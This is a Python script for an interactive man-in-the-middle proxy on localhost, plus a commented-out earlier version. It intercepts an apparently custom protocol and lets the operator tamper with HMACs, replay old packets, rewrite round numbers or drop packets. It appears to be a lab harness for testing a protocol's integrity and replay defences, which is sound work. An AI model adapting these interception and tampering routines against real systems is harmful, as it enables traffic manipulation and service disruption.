import socket
import selectors
import sys
import time

# Configuration
REAL_SERVER_ADDR = ("127.0.0.1", 65432)
PROXY_ADDR = ("127.0.0.1", 65433)
BUF = 4096

class PacketRecord:
    def __init__(self, direction, opcode, round_no, raw):
        self.direction = direction
        self.opcode = opcode
        self.round = round_no
        self.raw = raw

class ClientState:
    def __init__(self, csock, ssock):
        self.csock = csock
        self.ssock = ssock
        self.records = []

class UltimateAttacker:
    def __init__(self):
        self.sel = selectors.DefaultSelector()
        self.clients = {} 

    def parse(self, pkt):
        try:
            opcode = pkt[0]
            # Assumes 4-byte big-endian round number at index 2
            round_no = int.from_bytes(pkt[2:6], 'big')
            return opcode, round_no
        except:
            return 0, 0

    def flip_hmac(self, pkt):
        b = bytearray(pkt)
        b[-1] ^= 0xFF # Corrupt the HMAC suffix
        return bytes(b)

    def print_menu(self, context=""):
        options = {
            1: "Tamper HMAC (Modification)",
            2: "Replay Past Packet",
            3: "Reorder Attack (State Jump)",
            4: "Drop Packet (Key Desync)",
            5: "Pass Transparently"
        }
        print(f"\n--- ATTACK MENU [{context}] ---")
        for k, v in options.items():
            print(f"{k}. {v}")
        try:
            choice = input("Choice (default 5): ")
            return int(choice) if choice else 5
        except: return 5

    def handle_v2s(self, state, pkt):
        """Victim -> Server Interception"""
        opcode, rnd = self.parse(pkt)
        state.records.append(PacketRecord("C->S", opcode, rnd, pkt))
        print(f"\n[INTERCEPT] C->S | Opcode: {opcode} | Round: {rnd}")
        
        choice = self.print_menu(f"C->S Opcode {opcode}")

        if choice == 1:
            print("[ATTACK] Tampering C->S HMAC...")
            state.ssock.sendall(self.flip_hmac(pkt))
        elif choice == 2:
            target = int(input("Round # to replay (C->S): "))
            for r in state.records:
                if r.round == target and r.direction == "C->S":
                    print(f"[ATTACK] Replaying C->S Round {target}")
                    state.ssock.sendall(r.raw)
                    return
            state.ssock.sendall(pkt)
        elif choice == 3:
            print("[ATTACK] Reordering: Modifying internal round state...")
            b = bytearray(pkt)
            # Internally change round to an out-of-order value
            b[2:6] = (99).to_bytes(4, 'big')
            state.ssock.sendall(bytes(b))
        elif choice == 4:
            print("[ATTACK] Dropping C->S packet. Victim will timeout.")
            return # Drop
        else:
            state.ssock.sendall(pkt)

    def handle_s2v(self, state, pkt):
        """Server -> Victim Interception"""
        opcode, rnd = self.parse(pkt)
        state.records.append(PacketRecord("S->C", opcode, rnd, pkt))
        print(f"\n[INTERCEPT] S->C | Opcode: {opcode} | Round: {rnd}")
        
        choice = self.print_menu(f"S->C Opcode {opcode}")

        if choice == 1:
            print("[ATTACK] Tampering S->C HMAC...")
            state.csock.sendall(self.flip_hmac(pkt))
        elif choice == 2:
            target = int(input("Round # to replay (S->C): "))
            for r in state.records:
                if r.round == target and r.direction == "S->C":
                    print(f"[ATTACK] Replaying S->C Round {target}")
                    state.csock.sendall(r.raw)
                    return
            state.csock.sendall(pkt)
        elif choice == 3:
            print("[ATTACK] Reordering: Modifying internal round state...")
            b = bytearray(pkt)
            b[2:6] = (99).to_bytes(4, 'big')
            state.csock.sendall(bytes(b))
        elif choice == 4:
            print("[ATTACK] Dropping S->C packet. Victim will timeout/desync.")
            return # Drop
        else:
            state.csock.sendall(pkt)

    def start(self):
        lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        lsock.bind(PROXY_ADDR)
        lsock.listen(5)
        lsock.setblocking(False)
        self.sel.register(lsock, selectors.EVENT_READ)
        print(f"[*] Fully Interactive Bridge on {PROXY_ADDR}")

        while True:
            events = self.sel.select()
            for key, _ in events:
                sock = key.fileobj
                if sock is lsock:
                    v_conn, _ = sock.accept()
                    s_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s_conn.connect(REAL_SERVER_ADDR)
                    v_conn.setblocking(False)
                    s_conn.setblocking(False)
                    state = ClientState(v_conn, s_conn)
                    self.clients[v_conn] = state
                    self.clients[s_conn] = state
                    self.sel.register(v_conn, selectors.EVENT_READ)
                    self.sel.register(s_conn, selectors.EVENT_READ)
                    print("[+] MITM Session Established.")
                else:
                    state = self.clients.get(sock)
                    if not state: continue
                    try:
                        pkt = sock.recv(BUF)
                        if not pkt:
                            self.sel.unregister(state.csock)
                            self.sel.unregister(state.ssock)
                            continue
                        if sock is state.csock: self.handle_v2s(state, pkt)
                        else: self.handle_s2v(state, pkt)
                    except: pass

if __name__ == "__main__":
    UltimateAttacker().start()

# import socket
# import threading
# import sys
# import time

# REAL_SERVER_ADDR = ("127.0.0.1", 65432)
# PROXY_ADDR = ("127.0.0.1", 65433)

# class UltimateAttacker:
#     def __init__(self, mode):
#         self.mode = mode.upper()
#         self.packet_history = []
#         self.v_conn = None
#         self.s_conn = None
#         self.withheld_once = False

#     def start(self):
#         proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         proxy_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#         proxy_sock.bind(PROXY_ADDR)
#         proxy_sock.listen(5)
#         print(f"[*] Attacker Bridge ACTIVE on {PROXY_ADDR}")
#         print(f"[*] Simulation Mode: {self.mode}")

#         while True:
#             self.v_conn, addr = proxy_sock.accept()
#             print(f"[+] Victim {addr} connected.")
#             self.s_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             self.s_conn.connect(REAL_SERVER_ADDR)

#             threading.Thread(target=self.relay_s2v, daemon=True).start()
#             self.intercept_v2s()

#     def relay_s2v(self):
#         """Relays Server -> Victim traffic."""
#         while True:
#             try:
#                 data = self.s_conn.recv(4096)
#                 if not data: break
                
#                 # --- ATTACK: KEY_DESYNC ---
#                 if self.mode == "KEY_DESYNC" and data[0] == 40 and not self.withheld_once:
#                     print("[Attack] Withholding Server response to cause Key Desync...")
#                     self.withheld_once = True
#                     continue 
                
#                 self.v_conn.sendall(data)
#             except: break

#     def intercept_v2s(self):
#         """Intercepts Victim -> Server traffic."""
#         while True:
#             try:
#                 packet = self.v_conn.recv(4096)
#                 if not packet: break
                
#                 opcode = packet[0]
#                 if opcode == 30:
                    
#                     if self.mode == "REORDER":
#                         print("[Attack] Simulating Reorder: Modifying Round Number to 99...")
#                         packet = bytearray(packet)
#                         packet[2:6] = (99).to_bytes(4, 'big')
#                         packet = bytes(packet)

#                     elif self.mode == "REPLAY":
#                         if len(self.packet_history) == 0:
#                             self.packet_history.append(packet)
#                             print("[Attack] Captured Round R packet.")
#                         else:
#                             print("[Attack] Injecting stale packet from a previous round.")
#                             packet = self.packet_history[0]

#                     elif self.mode == "MODIFY":
#                         packet = bytearray(packet)
#                         packet[-1] ^= 0xFF 
#                         print("[Attack] Tampered with HMAC field.")

#                 self.s_conn.sendall(packet)
#             except: break

# if __name__ == "__main__":
#     if len(sys.argv) < 2:
#         print("Usage: python3 attacks.py [REPLAY | MODIFY | REORDER | KEY_DESYNC]")
#         sys.exit()
#     UltimateAttacker(sys.argv[1]).start()